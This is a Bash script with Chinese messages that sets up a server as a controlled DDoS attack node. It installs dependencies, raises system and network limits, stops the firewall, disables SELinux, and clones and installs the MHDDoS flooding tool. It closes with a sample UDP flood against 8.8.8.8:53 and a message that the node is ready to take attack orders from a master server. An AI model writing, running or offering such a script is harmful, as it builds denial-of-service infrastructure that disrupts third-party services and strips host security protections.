#!/bin/bash

# ==================== 被控端一体化脚本 ====================
# 功能：全新服务器 -> 完全配置 -> 可攻击状态
# 包含：环境安装 + 依赖安装 + 系统优化 + MHDDoS安装
# 版本：v1.0
# ========================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║                                                            ║"
echo "║           被控端服务器一键配置脚本 v1.0                   ║"
echo "║                                                            ║"
echo "║           全自动安装 + 优化 + 解除限制                    ║"
echo "║                                                            ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""

# 检查 root 权限
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}✗ 请使用 root 权限运行${NC}"
    echo "使用: sudo bash $0"
    exit 1
fi

echo -e "${GREEN}开始配置被控端服务器...${NC}"
echo ""

# ==================== 第一步：检测系统 ====================
echo -e "${CYAN}[1/8] 检测操作系统...${NC}"
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    echo -e "${GREEN}✓ 系统: $PRETTY_NAME${NC}"
else
    echo -e "${RED}✗ 无法检测系统${NC}"
    exit 1
fi
echo ""

# ==================== 第二步：安装基础工具 ====================
echo -e "${CYAN}[2/8] 安装基础工具和依赖...${NC}"
if [[ "$OS" == "centos" || "$OS" == "rhel" ]]; then
    echo -e "${YELLOW}  → 更新 yum...${NC}"
    yum update -y >/dev/null 2>&1
    echo -e "${YELLOW}  → 安装工具包...${NC}"
    yum install -y git wget curl vim net-tools python3 python3-pip gcc make >/dev/null 2>&1
else
    echo -e "${YELLOW}  → 更新 apt...${NC}"
    apt update -y >/dev/null 2>&1
    echo -e "${YELLOW}  → 安装工具包...${NC}"
    apt install -y git wget curl vim net-tools python3 python3-pip build-essential >/dev/null 2>&1
fi
echo -e "${GREEN}✓ 基础工具安装完成${NC}"
echo ""

# ==================== 第三步：优化系统参数 ====================
echo -e "${CYAN}[3/8] 优化系统参数...${NC}"

# 文件描述符限制
echo -e "${YELLOW}  → 设置文件描述符限制...${NC}"
ulimit -n 65535

if ! grep -q "nofile 65535" /etc/security/limits.conf 2>/dev/null; then
    cat >> /etc/security/limits.conf << 'EOF'
# MHDDoS 优化配置
* soft nofile 65535
* hard nofile 65535
* soft nproc 65535
* hard nproc 65535
EOF
fi

# 网络参数优化
echo -e "${YELLOW}  → 优化网络参数...${NC}"
cat > /etc/sysctl.d/99-mhddos.conf << 'EOF'
# MHDDoS 网络优化
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728
net.ipv4.tcp_rmem = 4096 87380 67108864
net.ipv4.tcp_wmem = 4096 65536 67108864
net.ipv4.tcp_tw_reuse = 1
net.ipv4.ip_local_port_range = 1024 65535
net.ipv4.tcp_max_syn_backlog = 8192
net.core.somaxconn = 8192
net.ipv4.tcp_fin_timeout = 30
EOF
sysctl -p /etc/sysctl.d/99-mhddos.conf >/dev/null 2>&1

echo -e "${GREEN}✓ 系统参数优化完成${NC}"
echo ""

# ==================== 第四步：关闭防火墙 ====================
echo -e "${CYAN}[4/8] 关闭防火墙...${NC}"
systemctl stop firewalld 2>/dev/null && echo -e "${GREEN}  ✓ firewalld 已停止${NC}"
systemctl disable firewalld 2>/dev/null
systemctl stop ufw 2>/dev/null && echo -e "${GREEN}  ✓ ufw 已停止${NC}"
systemctl disable ufw 2>/dev/null
echo -e "${GREEN}✓ 防火墙已关闭${NC}"
echo ""

# ==================== 第五步：关闭 SELinux ====================
echo -e "${CYAN}[5/8] 关闭 SELinux...${NC}"
if [ -f /etc/selinux/config ]; then
    setenforce 0 2>/dev/null
    sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
    sed -i 's/SELINUX=permissive/SELINUX=disabled/g' /etc/selinux/config
    echo -e "${GREEN}✓ SELinux 已禁用${NC}"
else
    echo -e "${YELLOW}⚠ 系统无 SELinux${NC}"
fi
echo ""

# ==================== 第六步：升级 pip ====================
echo -e "${CYAN}[6/8] 升级 pip...${NC}"
python3 -m pip install --upgrade pip -q 2>/dev/null
echo -e "${GREEN}✓ pip 已升级${NC}"
echo ""

# ==================== 第七步：安装 MHDDoS ====================
echo -e "${CYAN}[7/8] 安装 MHDDoS...${NC}"

# 创建目录
mkdir -p /root/sxjb
cd /root/sxjb

# 克隆或更新
if [ -d "MHDDoS" ]; then
    echo -e "${YELLOW}  → MHDDoS 已存在，更新中...${NC}"
    cd MHDDoS
    git pull 2>&1 | tail -1
else
    echo -e "${YELLOW}  → 克隆 MHDDoS 仓库...${NC}"
    git clone https://github.com/MatrixTM/MHDDoS.git 2>&1 | tail -1
    cd MHDDoS
fi

# 安装依赖
echo -e "${YELLOW}  → 安装 Python 依赖（这可能需要几分钟）...${NC}"
echo ""

# 完整的依赖列表（MHDDoS 所有需要的包）
echo -e "${YELLOW}  → 安装所有依赖包...${NC}"
pip3 install --upgrade \
    yarl \
    certifi \
    PySocks \
    aiohttp \
    aiohttp-socks \
    requests \
    cloudscraper \
    impacket \
    psutil \
    pycryptodome \
    icmplib \
    cfscrape \
    pyOpenSSL \
    brotli \
    urllib3 2>&1 | grep -E "(Successfully|Requirement)" | tail -15

# 从 GitHub 安装 PyRoxy（必须的）
echo ""
echo -e "${YELLOW}  → 安装 PyRoxy...${NC}"
pip3 install git+https://github.com/MHProDev/PyRoxy.git 2>&1 | tail -2

# 验证关键依赖
echo ""
echo -e "${YELLOW}  → 验证关键依赖...${NC}"
python3 -c "import PyRoxy" 2>/dev/null && echo -e "${GREEN}  ✓ PyRoxy${NC}" || echo -e "${RED}  ✗ PyRoxy${NC}"
python3 -c "import icmplib" 2>/dev/null && echo -e "${GREEN}  ✓ icmplib${NC}" || echo -e "${RED}  ✗ icmplib${NC}"
python3 -c "import aiohttp" 2>/dev/null && echo -e "${GREEN}  ✓ aiohttp${NC}" || echo -e "${RED}  ✗ aiohttp${NC}"

echo ""
echo -e "${GREEN}✓ MHDDoS 安装完成${NC}"
echo ""

# ==================== 第八步：验证安装 ====================
echo -e "${CYAN}[8/8] 验证安装...${NC}"

errors=0

# 检查 Python
if command -v python3 >/dev/null 2>&1; then
    echo -e "${GREEN}  ✓ Python3: $(python3 --version)${NC}"
else
    echo -e "${RED}  ✗ Python3 未安装${NC}"
    errors=$((errors + 1))
fi

# 检查 MHDDoS
if [ -f "/root/sxjb/MHDDoS/start.py" ]; then
    echo -e "${GREEN}  ✓ MHDDoS: /root/sxjb/MHDDoS${NC}"
else
    echo -e "${RED}  ✗ MHDDoS 未找到${NC}"
    errors=$((errors + 1))
fi

# 检查系统资源
cpu=$(nproc 2>/dev/null || echo "未知")
mem=$(free -h 2>/dev/null | awk '/^Mem:/{print $2}' || echo "未知")
echo -e "${GREEN}  ✓ CPU: ${cpu}核 | 内存: ${mem}${NC}"

# 检查文件描述符
ulimit_value=$(ulimit -n)
echo -e "${GREEN}  ✓ 文件描述符: ${ulimit_value}${NC}"

echo ""

# ==================== 完成 ====================
if [ $errors -eq 0 ]; then
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}✓✓✓ 配置完成！服务器已就绪！✓✓✓${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}安装信息:${NC}"
    echo -e "  MHDDoS 路径: ${GREEN}/root/sxjb/MHDDoS${NC}"
    echo -e "  Python 版本: ${GREEN}$(python3 --version)${NC}"
    echo -e "  系统资源: ${GREEN}CPU ${cpu}核 | 内存 ${mem}${NC}"
    echo ""
    echo -e "${YELLOW}测试命令:${NC}"
    echo -e "  ${CYAN}cd /root/sxjb/MHDDoS${NC}"
    echo -e "  ${CYAN}python3 start.py UDP 8.8.8.8:53 3000 30 debug${NC}"
    echo ""
    echo -e "${GREEN}现在可以接收主控端的攻击指令了！${NC}"
    echo ""
else
    echo -e "${RED}✗ 安装过程中出现 $errors 个错误${NC}"
    exit 1
fi
